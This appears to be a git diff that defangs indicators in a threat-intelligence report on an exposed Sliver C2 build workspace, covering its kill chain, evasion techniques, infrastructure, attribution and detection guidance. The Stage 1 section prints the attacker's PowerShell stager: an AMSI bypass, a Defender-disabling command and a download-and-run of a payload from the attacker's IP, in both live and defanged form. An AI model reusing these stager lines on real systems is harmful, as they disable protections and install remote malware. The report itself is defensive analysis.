@@ -26,7 +26,7 @@ description: "A complete Sliver C2 build workspace exposed at 45.94.31.220 on bu
 stix_bundle: /stix/sliver-open-directory.json
 ---
 
-**Campaign Identifier:** WebServer-Compromise-Kit-45.94.31.220<br>
+**Campaign Identifier:** WebServer-Compromise-Kit-45[.]94[.]31[.]220<br>
 **Last Updated:** March 1, 2026<br>
 **Threat Level:** MEDIUM
 
@@ -38,7 +38,7 @@ stix_bundle: /stix/sliver-open-directory.json
 {: .hl-tier-1}
 {: .hl-tab-overview}
 
-An exposed open directory at `45.94.31.220`, hosted on bulletproof infrastructure operated by 1337 Services GmbH (AS210558), yielded a complete attacker build workspace containing 270 files, 69 subdirectories, and 144 MB of offensive tooling. The workspace includes a fully operational Sliver C2 implant wrapped in a ScareCrow loader with 15 layered EDR evasion techniques, custom source code for five evasion modules, a fraudulent VMware code-signing certificate with its unencrypted private key, and a Sliver beacon generation command revealing complete C2 configuration. The toolkit was built on 2026-02-14 at 15:01 UTC and discovered approximately 6.75 hours later, likely before successful victim deployment.
+An exposed open directory at `45[.]94[.]31[.]220`, hosted on bulletproof infrastructure operated by 1337 Services GmbH (AS210558), yielded a complete attacker build workspace containing 270 files, 69 subdirectories, and 144 MB of offensive tooling. The workspace includes a fully operational Sliver C2 implant wrapped in a ScareCrow loader with 15 layered EDR evasion techniques, custom source code for five evasion modules, a fraudulent VMware code-signing certificate with its unencrypted private key, and a Sliver beacon generation command revealing complete C2 configuration. The toolkit was built on 2026-02-14 at 15:01 UTC and discovered approximately 6.75 hours later, likely before successful victim deployment.
 
 I categorize this as cybercrime at HIGH confidence, 80 percent, and designate the operator **<a href="/actors/UTA-2026-001/">UTA-2026-001</a>** *(an internal tracking label used by The Hunters Ledger, see Section 6)*.
 **Threat Level:** MEDIUM, C2 infrastructure offline at analysis time; no confirmed victims; automated build pipeline means functionally equivalent beacons can be regenerated in approximately 8 minutes.
@@ -49,8 +49,8 @@ The intelligence here is descriptive, covering what was built, and explanatory, 
 > **Key caveat:** File hashes for the primary samples are specific to the 2026-02-14 build. The automated build pipeline can regenerate polymorphically distinct but functionally identical beacons in approximately 8 minutes. Certificate-based and behavioral IOCs are more durable than hash-based atomic indicators.
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img loading="lazy" src="{{ "/assets/images/sliver-open-directory/opendirectory.png" | relative_url }}" alt="Open directory listing at 45.94.31.220 port 8080 showing indexed files tagged with malware and exploit classifications by a third-party scanner">
-  <figcaption><em>Figure 1: The exposed open directory at 45.94.31.220:8080, already indexed and classified by a third-party open directory scanner before this analysis began. Note malware/exploit classifications applied to ScareCrow, Donut, and source modules visible in the listing.</em></figcaption>
+  <img loading="lazy" src="{{ "/assets/images/sliver-open-directory/opendirectory.png" | relative_url }}" alt="Open directory listing at 45[.]94[.]31[.]220 port 8080 showing indexed files tagged with malware and exploit classifications by a third-party scanner">
+  <figcaption><em>Figure 1: The exposed open directory at 45[.]94[.]31[.]220:8080, already indexed and classified by a third-party open directory scanner before this analysis began. Note malware/exploit classifications applied to ScareCrow, Donut, and source modules visible in the listing.</em></figcaption>
 </figure>
 
 ---
@@ -61,11 +61,11 @@ The intelligence here is descriptive, covering what was built, and explanatory, 
 
 ### The Threat in Clear Terms
 
-On 2026-02-14, a threat actor operating from a bulletproof VPS at `45.94.31.220` ran an automated build pipeline that produced a fully operational Sliver C2 implant wrapped inside a ScareCrow Go loader with 15 distinct EDR evasion techniques. Six hours and forty-five minutes later, the entire build workspace (including source code, build logs, compiled binaries, and an unencrypted private signing key) was indexed by an open-directory scanner [Hunt.io](https://hunt.io/). I cover the resulting intelligence below.
+On 2026-02-14, a threat actor operating from a bulletproof VPS at `45[.]94[.]31[.]220` ran an automated build pipeline that produced a fully operational Sliver C2 implant wrapped inside a ScareCrow Go loader with 15 distinct EDR evasion techniques. Six hours and forty-five minutes later, the entire build workspace (including source code, build logs, compiled binaries, and an unencrypted private signing key) was indexed by an open-directory scanner [Hunt.io](https://hunt.io/). I cover the resulting intelligence below.
 
 What defenders gained from this exposure is implementation-level understanding of the attacker's complete toolchain, not just binary artifacts but the source code, build logic, C2 configuration, and operational records that drive detection, hunting and attribution. That depth of pre-deployment intelligence is rare, and it enables defensive action that would otherwise require a full incident response engagement.
 
-What the attacker built is a four-stage kill chain, PowerShell stager to ScareCrow-wrapped loader to Donut shellcode bootstrap to Sliver C2 beacon, designed to defeat endpoint detection at every layer. The loader targets `C:\Windows\System32\sihost.exe` for process hollowing (per build.log; the injection target was not live-confirmed in dynamic analysis) and beacons to `mailuxe.net:443`, `mailmassange.duckdns.org:443`, and `mailuxe.net:8443` using mutual TLS with an effective 90 to 510 second callback window (300-second base, 70% jitter) and a 2027-12-31 killswitch.
+What the attacker built is a four-stage kill chain, PowerShell stager to ScareCrow-wrapped loader to Donut shellcode bootstrap to Sliver C2 beacon, designed to defeat endpoint detection at every layer. The loader targets `C:\Windows\System32\sihost.exe` for process hollowing (per build.log; the injection target was not live-confirmed in dynamic analysis) and beacons to `mailuxe[.]net:443`, `mailmassange[.]duckdns[.]org:443`, and `mailuxe[.]net:8443` using mutual TLS with an effective 90 to 510 second callback window (300-second base, 70% jitter) and a 2027-12-31 killswitch.
 
 Defenders can act now on the certificate serial `659EEB5AA4A489FB238993AF259D23F057F6D6D6`, the SysWhispers3 hash seed `0x9DEA8D94`, the hardcoded PEB spoofing string `MicrosoftEdgeUpdate.exe --update-check --silent`, and the behavioral five-step process ghosting sequence. All four are detectable artifacts that survive polymorphic rebuilds.
 
@@ -89,9 +89,9 @@ Defenders can act now on the certificate serial `659EEB5AA4A489FB238993AF259D23F
 2. **15 EDR evasion techniques** active across the kill chain: 7 custom-implemented (SysWhispers3, call stack spoofing, process ghosting, Heaven's Gate, string obfuscation, VM checks, argument spoofing), 5 ScareCrow-delegated (PPID spoofing, ETW patching, AMSI patching, sleep masking, module stomping), 3 ScareCrow-native (entropy normalization, timestamp manipulation, code signing).
 3. **Fraudulent VMware certificate with exposed private key**: Serial `659EEB5AA4A489FB238993AF259D23F057F6D6D6`; unencrypted `key.pem` means any third party who downloaded the key can sign arbitrary binaries with the VMware-impersonating identity.
 4. **SysWhispers3 HalosGate indirect syscalls**: Six NT functions bypassed at the direct syscall level; EDRs relying solely on usermode ntdll hook telemetry are blind to process injection operations.
-5. **Sliver C2 with three-endpoint resilience**: mTLS (mutual TLS, a two-way encryption and authentication protocol) beaconing to `mailuxe.net` and `mailmassange.duckdns.org`; random endpoint selection defeats single-domain blocking; 2027 killswitch indicates planned multi-year operation.
+5. **Sliver C2 with three-endpoint resilience**: mTLS (mutual TLS, a two-way encryption and authentication protocol) beaconing to `mailuxe[.]net` and `mailmassange[.]duckdns[.]org`; random endpoint selection defeats single-domain blocking; 2027 killswitch indicates planned multi-year operation.
 6. **Process hollowing into sihost.exe** (process hollowing is a technique where the malware hides itself inside a trusted Windows system process, making it invisible to detection tools): process hollowing as the active injection mode is DEFINITE (XZ config header mode byte 0x04, confirmed in dynamic analysis); the `sihost.exe` target process is MODERATE confidence (75%) from build.log, not confirmed in live analysis. sihost.exe is a trusted Shell Infrastructure Host, outbound connections from it to non-Microsoft addresses are anomalous and high-value hunt leads regardless of which process the actual runtime target proves to be.
-7. **Bulletproof hosting confirmed**: 1337 Services GmbH co-founders linked to DOJ Operation Talent (Cracked.to/Nulled.to seizure); threat intelligence feeds flag AS210558 as presumptively malicious infrastructure.
+7. **Bulletproof hosting confirmed**: 1337 Services GmbH co-founders linked to DOJ Operation Talent (Cracked[.]to/Nulled.to seizure); threat intelligence feeds flag AS210558 as presumptively malicious infrastructure.
 8. **Build pipeline fingerprint survives rebuilds**: SysWhispers3 hash seed `0x9DEA8D94`, stub/implemented module architecture, and the `MicrosoftEdgeUpdate.exe` PEB spoofing string are compiled constants detectable across polymorphic builds.
 9. **Stager-loader skill gap**: The stager uses one of the most widely detected AMSI bypass techniques alongside a loader with HalosGate indirect syscalls, a strong indicator of two-party development (access broker + custom toolkit builder).
 10. **Pre-deployment discovery**: Infrastructure indexed approximately 6.75 hours after build completion, likely before confirmed victim compromise.
@@ -190,18 +190,18 @@ The kill chain runs through four stages from delivery to C2 establishment. Becau
 
 ### Stage 0: Attacker Build Pipeline (Pre-Victim)
 
-On 2026-02-14 at 15:01:23 UTC, the attacker's automated build pipeline executed on `45.94.31.220` in the working directory `/var/tmp/.cache-1f6a38a2-1771081283`. Five sequential phases ran over approximately eight minutes:
+On 2026-02-14 at 15:01:23 UTC, the attacker's automated build pipeline executed on `45[.]94[.]31[.]220` in the working directory `/var/tmp/.cache-1f6a38a2-1771081283`. Five sequential phases ran over approximately eight minutes:
 
 - **Phase 1 (15:01:23):** Installed Go 1.24.2; cloned and built ScareCrow, Donut, and SysWhispers3 from public repositories.
 - **Phase 2 (15:01:32):** Generated the fraudulent RSA-2048 VMware code-signing certificate via scripted `openssl req -x509`. Certificate's `Valid From` timestamp (15:01:32) is 9 seconds after build start, a build timeline artifact.
 - **Phase 3 (15:01:32):** Compiled 15 evasion modules (7 custom C/ASM, 5 stubs for ScareCrow delegation, 3 ScareCrow-native).
 - **Phase 4 (15:01:32-15:08:34):** Called the Sliver C2 server to generate 19,353,426 bytes of raw shellcode. Shellcode generation took approximately 7 minutes.
-- **Phase 5 (15:08:34+):** Applied ScareCrow polymorphic obfuscation (2,558 sequential encrypted chunks) and signed the output with the fraudulent cert. Output: `OneDriveSync.exe` (~33 MB) hosted at `hxxp[:]//45.94.31[.]220:8000/`.
+- **Phase 5 (15:08:34+):** Applied ScareCrow polymorphic obfuscation (2,558 sequential encrypted chunks) and signed the output with the fraudulent cert. Output: `OneDriveSync.exe` (~33 MB) hosted at `hxxp[:]//45[.]94[.]31[.]220:8000/`.
 
 **Sliver beacon configuration (from Sliver-command.txt and build.log):**
 
 ```
-C2 endpoints:   mailuxe.net:443, mailmassange.duckdns.org:443, mailuxe.net:8443
+C2 endpoints:   mailuxe[.]net:443, mailmassange[.]duckdns[.]org:443, mailuxe[.]net:8443
 Selection:      Random (--strategy r)
 Beacon name:    OneDriveSync
 Injection:      C:\Windows\System32\sihost.exe
@@ -213,7 +213,7 @@ Killswitch:     2027-12-31 23:59:59
 Canary:         intezer.com
 ```
 
-The defender opportunity is that the single-server architecture concentrates build server, C2 server, and payload delivery server on one IP. Blocking `45.94.31.220` (and monitoring `mailuxe.net` and `mailmassange.duckdns.org`) addresses multiple kill chain stages with one network control. The open directory scanner at port 8080 had already tagged ScareCrow, Donut, and the source modules with malware and exploit classifications before this analysis began, which shows the value of continuous internet surface monitoring.
+The defender opportunity is that the single-server architecture concentrates build server, C2 server, and payload delivery server on one IP. Blocking `45[.]94[.]31[.]220` (and monitoring `mailuxe[.]net` and `mailmassange[.]duckdns[.]org`) addresses multiple kill chain stages with one network control. The open directory scanner at port 8080 had already tagged ScareCrow, Donut, and the source modules with malware and exploit classifications before this analysis began, which shows the value of continuous internet surface monitoring.
 
 ---
 
@@ -229,7 +229,7 @@ The victim executes `stager.ps1` through an undetermined delivery mechanism. No 
 
 ```powershell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-    .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    .GetField('[a]msiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
 Uses .NET reflection to set `amsiInitFailed` to `true` in the PowerShell runtime assembly. This causes AMSI to report initialization failure, disabling content scanning for the session. This is one of the most widely detected AMSI bypass techniques in existence. Its presence alongside the custom ScareCrow loader strongly suggests two different authors, a readily-available stager template and a custom-developed loader.
@@ -237,7 +237,7 @@ Uses .NET reflection to set `amsiInitFailed` to `true` in the PowerShell runtime
 **Action 2, Windows Defender Disable (admin-conditional):**
 
 ```powershell
-try{Set-MpPreference -DisableRealtimeMonitoring $true}catch{}
+[t]ry{Set-MpPreference -DisableRealtimeMonitoring $true}catch{}
 ```
 
 Silent failure if insufficient privileges. If successful, triggers Windows Event ID 5001 in the Defender Operational log.
@@ -245,9 +245,9 @@ Silent failure if insufficient privileges. If successful, triggers Windows Event
 **Action 3, Payload Download and Execute:**
 
 ```powershell
-$url="http://45.94.31.220:8000/OneDriveSync.exe"
+$url="hxxp://45[.]94[.]31[.]220:8000/OneDriveSync.exe"
 $p="$env:TEMP\update.exe"
-(New-Object Net.WebClient).DownloadFile($url,$p)
+([N]ew-Object Net.WebClient).DownloadFile($url,$p)
 Start-Process $p -WindowStyle Hidden
 ```
 
@@ -256,7 +256,7 @@ Downloads `OneDriveSync.exe` over unencrypted HTTP from port 8000. Writes to `%T
 **Defender telemetry at Stage 1:**
 
 - Sysmon EID 1: `powershell.exe` process creation
-- Sysmon EID 3: outbound connection from `powershell.exe` to `45.94.31.220:8000`
+- Sysmon EID 3: outbound connection from `powershell.exe` to `45[.]94[.]31[.]220:8000`
 - Sysmon EID 11: `powershell.exe` creating `update.exe` in `%TEMP%`
 - PowerShell Script Block Logging (EID 4104): full stager content captured, including `amsiInitFailed` string
 - Windows Defender EID 5001 (if admin-level execution)
@@ -414,9 +414,9 @@ The C2 infrastructure is confirmed offline as of 2026-02-27. Three independent d
 
 | Parameter          | Value                                                       |
 | ------------------ | ----------------------------------------------------------- |
-| Primary C2         | `mailuxe.net:443` (HTTPS/mTLS)                              |
-| Backup C2          | `mailmassange.duckdns.org:443` (HTTPS/mTLS)                 |
-| Fallback C2        | `mailuxe.net:8443` (HTTPS/mTLS)                             |
+| Primary C2         | `mailuxe[.]net:443` (HTTPS/mTLS)                              |
+| Backup C2          | `mailmassange[.]duckdns[.]org:443` (HTTPS/mTLS)                 |
+| Fallback C2        | `mailuxe[.]net:8443` (HTTPS/mTLS)                             |
 | Selection          | Random, blocking one endpoint does not disrupt beaconing   |
 | Callback interval  | 300-900 seconds base; 70% jitter (effective 90-510 seconds) |
 | Failure tolerance  | 100 consecutive failures before self-termination            |
@@ -720,23 +720,23 @@ I hold the bulletproof classification at HIGH, 90 percent, and the ASN identific
 | Domain count on ASN | ~2,152 domains across 889 IP addresses                                   |
 
 
-The bulletproof classification is confirmed by the provider's own marketing. 1337 Services GmbH explicitly advertises "bulletproof VPS" services at x1337.cc, including "unmetered bandwidth, all ports open, included SMTP ports" and "unmetered IP spoofing enabled dedicated servers." Scamalytics rates the ASN as medium-to-high fraud risk with over 37% of traffic flagged as fraudulent or suspicious. Abuse.ch (ThreatFox) labels infrastructure from this ASN as under cybercriminal control, with a near-zero response rate to standard AbuseIPDB and DMCA abuse reports.
+The bulletproof classification is confirmed by the provider's own marketing. 1337 Services GmbH explicitly advertises "bulletproof VPS" services at x1337[.]cc, including "unmetered bandwidth, all ports open, included SMTP ports" and "unmetered IP spoofing enabled dedicated servers." Scamalytics rates the ASN as medium-to-high fraud risk with over 37% of traffic flagged as fraudulent or suspicious. Abuse.ch (ThreatFox) labels infrastructure from this ASN as under cybercriminal control, with a near-zero response rate to standard AbuseIPDB and DMCA abuse reports.
 
-There is a law enforcement connection. Krebs on Security (February 2025) linked the co-founders of 1337 Services GmbH, Florian Marzahl ("FloraiN", former Cracked.to administrator) and Finn Grimpe ("Finndev", linked to Nulled.to), to the **StarkRDP** and **rdp.sh** services seized during **DOJ Operation Talent**, which targeted the Cracked.to and Nulled.to cybercrime forums. Those forums traffic in stolen credentials, malware, and hacking tools. Domain names were seized, and no criminal charges were filed specifically against the 1337 Services GmbH principals at the time of reporting.
+There is a law enforcement connection. Krebs on Security (February 2025) linked the co-founders of 1337 Services GmbH, Florian Marzahl ("FloraiN", former Cracked[.]to administrator) and Finn Grimpe ("Finndev", linked to Nulled[.]to), to the **StarkRDP** and **rdp.sh** services seized during **DOJ Operation Talent**, which targeted the Cracked[.]to and Nulled[.]to cybercrime forums. Those forums traffic in stolen credentials, malware, and hacking tools. Domain names were seized, and no criminal charges were filed specifically against the 1337 Services GmbH principals at the time of reporting.
 
-At the network level, threat intelligence feeds flag AS210558 as presumptively malicious infrastructure, and all IPs in the 45.94.31.0/24 range should be treated accordingly.
+At the network level, threat intelligence feeds flag AS210558 as presumptively malicious infrastructure, and all IPs in the 45[.]94[.]31[.]0/24 range should be treated accordingly.
 
-The sources here are the IPinfo.io AS210558 record (Tier 1), PeeringDB AS210558 (Tier 1), Krebs on Security's "Who's Behind the Seized Forums 'Cracked' & 'Nulled'?" (Feb 2025, Tier 3, corroborated by DOJ records), x1337.cc as the provider's own marketing, and the Scamalytics assessment.
+The sources here are the IPinfo.io AS210558 record (Tier 1), PeeringDB AS210558 (Tier 1), Krebs on Security's "Who's Behind the Seized Forums 'Cracked' & 'Nulled'?" (Feb 2025, Tier 3, corroborated by DOJ records), x1337[.]cc as the provider's own marketing, and the Scamalytics assessment.
 
 ---
 
-### 5.2 Build Server: 45.94.31.220
+### 5.2 Build Server: 45[.]94[.]31[.]220
 
 **Roles confirmed on this single IP:**
 
 - **Build server**: automated pipeline executed here (from build.log)
-- **Payload delivery server**: `hxxp[:]//45.94.31[.]220:8000/` served the entire workspace
-- **C2 listener**: Sliver teamserver (ports 443, 8443); MODERATE confidence (70%), actual C2 may be on separate infrastructure if `mailuxe.net` resolves elsewhere
+- **Payload delivery server**: `hxxp[:]//45[.]94[.]31[.]220:8000/` served the entire workspace
+- **C2 listener**: Sliver teamserver (ports 443, 8443); MODERATE confidence (70%), actual C2 may be on separate infrastructure if `mailuxe[.]net` resolves elsewhere
 
 This single-server architecture is a significant OPSEC failure. All forensic evidence concentrates at one point. A single network block disrupts build, delivery, and C2 simultaneously.
 
@@ -755,9 +755,9 @@ This single-server architecture is a significant OPSEC failure. All forensic evi
 
 ### 5.3 C2 Domains
 
-`mailuxe.net` serves as both primary and fallback C2, on ports 443 and 8443. No prior malicious history was found in threat intelligence feeds at time of research (2026-02-28). Two competing hypotheses: (H1, more likely) newly registered/squatted domain, the domain co-locates on 45.94.31.220 alongside the bulletproof VPS build server, inconsistent with a legitimate business web presence; (H2) compromised legitimate domain. Passive DNS verification required to resolve. HIGH confidence of attacker control based on co-location and explicit build log reference.
+`mailuxe[.]net` serves as both primary and fallback C2, on ports 443 and 8443. No prior malicious history was found in threat intelligence feeds at time of research (2026-02-28). Two competing hypotheses: (H1, more likely) newly registered/squatted domain, the domain co-locates on 45[.]94[.]31[.]220 alongside the bulletproof VPS build server, inconsistent with a legitimate business web presence; (H2) compromised legitimate domain. Passive DNS verification required to resolve. HIGH confidence of attacker control based on co-location and explicit build log reference.
 
-`mailmassange.duckdns.org` is the backup C2, on port 443. It is a free, anonymous DuckDNS dynamic-DNS subdomain, requiring no registration. DuckDNS is among the most abused dynamic DNS services in malware campaigns, with documented use by APT28, APT29, Gamaredon, Scattered Spider, and multiple cybercrime operators. The backup domain provides C2 resilience: if `mailuxe.net` is sinkholed, the DuckDNS subdomain provides a fallback with a different infrastructure fingerprint. DuckDNS cooperates with law enforcement and maintains registration logs. The subdomain name `mailmassange` appears human-selected (low entropy) rather than algorithmically generated, consistent with a single operator.
+`mailmassange[.]duckdns[.]org` is the backup C2, on port 443. It is a free, anonymous DuckDNS dynamic-DNS subdomain, requiring no registration. DuckDNS is among the most abused dynamic DNS services in malware campaigns, with documented use by APT28, APT29, Gamaredon, Scattered Spider, and multiple cybercrime operators. The backup domain provides C2 resilience: if `mailuxe[.]net` is sinkholed, the DuckDNS subdomain provides a fallback with a different infrastructure fingerprint. DuckDNS cooperates with law enforcement and maintains registration logs. The subdomain name `mailmassange` appears human-selected (low entropy) rather than algorithmically generated, consistent with a single operator.
 
 ---
 
@@ -802,10 +802,10 @@ The threat actor is unknown, and I designate them **<a href="/actors/UTA-2026-00
 Threat Actor: Unknown (UTA-2026-001)
 Confidence: INSUFFICIENT for named attribution
   - Why this confidence: No infrastructure overlap with known named campaigns.
-    mailuxe.net shows no prior malicious history. 1337 Services GmbH hosts
+    mailuxe[.]net shows no prior malicious history. 1337 Services GmbH hosts
     thousands of domains. Build pipeline fingerprint (ScareCrow+Donut+SysWhispers3)
     is consistent with multiple independent operators using public tools.
-  - What's missing: Passive DNS data for mailuxe.net; second sample with C1/C2
+  - What's missing: Passive DNS data for mailuxe[.]net; second sample with C1/C2
     characteristic overlap; victim reports; prior sighting of certificate serial
     659EEB5AA4A489FB238993AF259D23F057F6D6D6.
   - What would increase confidence: Infrastructure overlap with a named Tier 1/2
@@ -889,9 +889,9 @@ The toolchain characteristics, infrastructure choices, and operational behaviors
 | Defense Evasion      | T1070        | Indicator Removal                            | MODERATE (65%) | process_ghosting.c FILE_FLAG_DELETE_ON_CLOSE; temp file deleted before process visible                                              |
 | Discovery            | T1082        | System Information Discovery                 | DEFINITE       | vm_checks.C GetSystemInfo() for dwNumberOfProcessors                                                                                |
 | Discovery            | T1057        | Process Discovery                            | MODERATE (60%) | ppid_spoof.C includes tlhelp32.h; PPID spoofing requires process enumeration                                                        |
-| Command and Control  | T1071.001    | Web Protocols                                | HIGH           | Sliver --http mailuxe.net:443, --http mailmassange.duckdns.org:443, --http mailuxe.net:8443                                         |
+| Command and Control  | T1071.001    | Web Protocols                                | HIGH           | Sliver --http mailuxe[.]net:443, --http mailmassange[.]duckdns[.]org:443, --http mailuxe[.]net:8443                                         |
 | Command and Control  | T1573.002    | Asymmetric Cryptography                      | HIGH           | Sliver mTLS (mutual TLS) for C2 channel; confirmed by --http flag and Sliver default                                                |
-| Command and Control  | T1105        | Ingress Tool Transfer                        | DEFINITE       | stager DownloadFile from [hxxp[:]//45.94.31[.]220:8000/OneDriveSync[.]exe](hxxp://45.94.31[.]220:8000/OneDriveSync[.]exe) → %TEMP%\update.exe |
+| Command and Control  | T1105        | Ingress Tool Transfer                        | DEFINITE       | stager DownloadFile from [hxxp[:]//45[.]94[.]31[.]220:8000/OneDriveSync[.]exe](hxxp://45.94.31[.]220:8000/OneDriveSync[.]exe) → %TEMP%\update.exe |
 
 
 On persistence, T1547.001 (Registry Run Keys) was assessed and NOT observed. Behavioral sandbox analysis recorded zero registry writes by the sample, and memory forensics found no persistence keys. Persistence is operator-deployed after C2 establishment rather than loader-automated.
@@ -969,10 +969,10 @@ update.exe → NtCreateThread()           (execution)
 
 **Network-based detection (C2 domains and server fingerprinting):**
 
-- Block and monitor `mailuxe.net`, `mailmassange.duckdns.org`, and `45.94.31.220` at network egress.
+- Block and monitor `mailuxe[.]net`, `mailmassange[.]duckdns[.]org`, and `45[.]94[.]31[.]220` at network egress.
 - Monitor `sihost.exe` for any outbound network connections to non-Microsoft addresses, legitimate sihost.exe connections are well-profiled and predominantly inbound/local; any outbound connection to an external IP is anomalous.
 - **Certificate serial TLS detection**: monitor for TLS connections where the server certificate carries serial `659EEB5AA4A489FB238993AF259D23F057F6D6D6`. This is the most durable C2 detection anchor.
-- Monitor for periodic DNS queries to `*.duckdns.org` from internal hosts at regular intervals.
+- Monitor for periodic DNS queries to `*.duckdns[.]org` from internal hosts at regular intervals.
 - **JARM fingerprinting** for the Sliver teamserver: Microsoft MSTIC documented Sliver-specific JARM hashes; the C2 server may be fingerprint-able even if the implant is not.
 - Sliver mTLS with randomized certificates presents less-signatured TLS traffic than Cobalt Strike's well-documented profiles, but Go binary runtime characteristics (static compilation, memory allocation patterns, HTTP header combinations) remain detectable hunting targets per Microsoft MSTIC research.
 - **Consistent POST request size (proxy/firewall log hunting):** Sliver beacon callbacks exhibit near-identical POST request sizes on each check-in cycle. Proxy and firewall logs showing consistent POST byte sizes (reference traffic from this campaign: ~1842 bytes) from a background process to an external host at irregular but bounded intervals (matching the 90-510 second callback window) are a beaconing fingerprint detectable without TLS inspection. Consistent byte-count POST traffic from a system process (`sihost.exe`) to a non-Microsoft external IP or domain at variable-but-bounded intervals is a viable SIEM hunting rule in environments without SSL inspection capability.
@@ -985,7 +985,7 @@ update.exe → NtCreateThread()           (execution)
 
 ### Critical Assumptions
 
-A1 assumes `mailuxe.net` resolves to 45.94.31.220. If that is wrong, and `mailuxe.net` resolves to a separate, better-protected C2 server, then blocking `45.94.31.220` alone would not disrupt C2 communications. A passive DNS lookup is the resolution path.
+A1 assumes `mailuxe[.]net` resolves to 45[.]94[.]31[.]220. If that is wrong, and `mailuxe[.]net` resolves to a separate, better-protected C2 server, then blocking `45[.]94[.]31[.]220` alone would not disrupt C2 communications. A passive DNS lookup is the resolution path.
 
 A2 concerns the actual C2 IP inside the Donut instance. I cannot confirm the C2 IP embedded in the AES-encrypted Donut section without offline decryption. The recovered AES-128-CTR key (`19 72 1F E6 E3 B0 CF 0C 32 0B 93 E0 C2 BE 91 1A`) and nonce (`EA 2A 1C 5A 8D E1 33 7B DA 31 47 65 40 51 D0 89`) enable offline decryption of the memory dump at VAD region `0x1f7f8e00000` to `0x1f7fa074fff`. **This is the highest-priority analytical gap.**
 
@@ -1004,9 +1004,9 @@ A7 assumes the threat actor is a cybercrime operator. If a state actor is delibe
 
 | Gap                                          | Impact                                                                               | Priority |
 | -------------------------------------------- | ------------------------------------------------------------------------------------ | -------- |
-| Actual C2 IP in Donut instance not confirmed | Cannot confirm beacon callout destination; blocking 45.94.31.220 may be insufficient | CRITICAL |
+| Actual C2 IP in Donut instance not confirmed | Cannot confirm beacon callout destination; blocking 45[.]94[.]31[.]220 may be insufficient | CRITICAL |
 | Excel.exe hash not recovered                 | Potential parallel campaign with uncharacterized C2                                  | HIGH     |
-| mailuxe.net passive DNS history              | Cannot confirm registration date or resolve H1/H2 hypothesis                         | HIGH     |
+| mailuxe[.]net passive DNS history              | Cannot confirm registration date or resolve H1/H2 hypothesis                         | HIGH     |
 | Hollow target not live-confirmed             | Monitoring focused on sihost.exe based on assumption                                 | MEDIUM   |
 | Sliver PE not extracted from memory          | Cannot confirm Sliver version or additional config options                           | MEDIUM   |
 | AMSI patch bytes not byte-verified           | Cannot confirm AmsiScanBuffer was actually patched                                   | LOW      |
@@ -1026,8 +1026,8 @@ A7 assumes the threat actor is a cybercrime operator. If a state actor is delibe
 
 **Priority 1: Immediate Containment**
 
-- Isolate any system that executed `stager.ps1` or made outbound connections to `45.94.31.220`, `mailuxe.net`, or `mailmassange.duckdns.org`
-- Block all three C2 destinations at network egress: `45.94.31.220`, `mailuxe.net` (ports 443, 8443), `mailmassange.duckdns.org` (port 443); also block AS210558 prefix space per threat intelligence guidance
+- Isolate any system that executed `stager.ps1` or made outbound connections to `45[.]94[.]31[.]220`, `mailuxe[.]net`, or `mailmassange[.]duckdns[.]org`
+- Block all three C2 destinations at network egress: `45[.]94[.]31[.]220`, `mailuxe[.]net` (ports 443, 8443), `mailmassange[.]duckdns[.]org` (port 443); also block AS210558 prefix space per threat intelligence guidance
 - Preserve forensic state before remediation: Memory forensics tool memory capture of affected systems enables Donut instance decryption and Sliver configuration recovery
 - Rotate credentials for any accounts that authenticated on potentially affected systems
 
@@ -1042,7 +1042,7 @@ A7 assumes the threat actor is a cybercrime operator. If a state actor is delibe
 **Priority 3: Scope Assessment**
 
 - Determine whether `Excel.exe` was also used as a delivery mechanism: the parallel delivery track is uncharacterized
-- Assess whether any endpoints made DNS queries to `mailmassange.duckdns.org` or `mailuxe.net` in the period from 2026-02-14 onward
+- Assess whether any endpoints made DNS queries to `mailmassange[.]duckdns[.]org` or `mailuxe[.]net` in the period from 2026-02-14 onward
 - Evaluate whether the private signing key (`key.pem`) was downloaded by parties other than analysts, third-party VMware-impersonating binaries with the same certificate serial may emerge
 
 **Priority 4: Remediation Approach**
@@ -1057,9 +1057,9 @@ Remediation strategy should reflect the injection architecture:
 
 - Deploy YARA rule targeting SysWhispers3 hash seed `\x94\x8D\xEA\x9D` across endpoint memory scanning
 - Hunt for TLS connections with certificate serial `659EEB5AA4A489FB238993AF259D23F057F6D6D6`
-- Search historical network logs for connections to `45.94.31.220:8000`, `mailuxe.net`, `mailmassange.duckdns.org`
+- Search historical network logs for connections to `45[.]94[.]31[.]220:8000`, `mailuxe[.]net`, `mailmassange[.]duckdns[.]org`
 - Monitor for processes claiming `MicrosoftEdgeUpdate.exe` identity running from non-standard paths
-- Review PowerShell EID 4104 logs for `amsiInitFailed` and `DownloadFile` from `45.94.31.220`
+- Review PowerShell EID 4104 logs for `amsiInitFailed` and `DownloadFile` from `45[.]94[.]31[.]220`
 - Enable kernel-level ETW telemetry providers (such as Microsoft-Windows-Threat-Intelligence) for enhanced visibility into syscall execution origins. This is the most effective counter to SysWhispers3-based evasion
 
 ---
@@ -1072,13 +1072,13 @@ This report already carries confidence labels through Sections 3, 6, 7, and 9. I
 
 **DEFINITE**: the active injection mode is process hollowing, confirmed by the XZ config header mode byte and by dynamic analysis. Of the 26 techniques in the Section 7 ATT&CK mapping, 18 carry this label, including the code-signing certificate infrastructure, the PowerShell stager, native syscalls via SysWhispers3, parent-PID spoofing, masquerading as a signed VMware binary, software packing and stripped symbols, the AES-encrypted Donut instance, the anti-VM and anti-sandbox checks, and the ingress tool transfer from the build server.
 
-**HIGH**: the threat category, cybercrime, most likely an access broker or post-access monetization operation, which I hold at 80 percent. Attacker control of `mailuxe.net`, based on its co-location with the bulletproof VPS build server and its explicit reference in the recovered build log. That `Excel.exe` shares the same payload core as `OneDriveSync.exe`, which I hold at 90 percent, based on an identical roughly 33 MB file size and matching build date, though the hash itself was not recovered. Three of the Section 7 ATT&CK rows carry this label: PEB command-line masquerading, and the two C2 techniques, web protocols and mutual TLS.
+**HIGH**: the threat category, cybercrime, most likely an access broker or post-access monetization operation, which I hold at 80 percent. Attacker control of `mailuxe[.]net`, based on its co-location with the bulletproof VPS build server and its explicit reference in the recovered build log. That `Excel.exe` shares the same payload core as `OneDriveSync.exe`, which I hold at 90 percent, based on an identical roughly 33 MB file size and matching build date, though the hash itself was not recovered. Three of the Section 7 ATT&CK rows carry this label: PEB command-line masquerading, and the two C2 techniques, web protocols and mutual TLS.
 
